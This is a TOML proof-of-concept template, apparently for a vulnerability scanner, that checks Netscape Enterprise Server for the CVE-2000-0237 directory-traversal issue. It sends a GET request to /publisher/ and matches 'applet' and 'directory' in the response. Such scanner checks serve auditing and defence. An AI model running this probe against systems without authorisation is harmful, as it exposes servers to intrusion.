[info]
author = "ave"
description = "检测目标 Netscape Enterprise Server 是否启用 Web Publishing 功能。通过向 /publisher 目录发送 GET 请求，验证是否存在目录遍历漏洞，该漏洞可导致攻击者浏览服务器任意目录。"
id = "POC-AVE-2000-0215"
name = "Netscape Enterprise Server 目录遍历漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0215"]
vuln_id = [
    "CVE-2000-0237",
    "AVE-2000-0215",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/publisher/"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "applet",
    "directory",
]
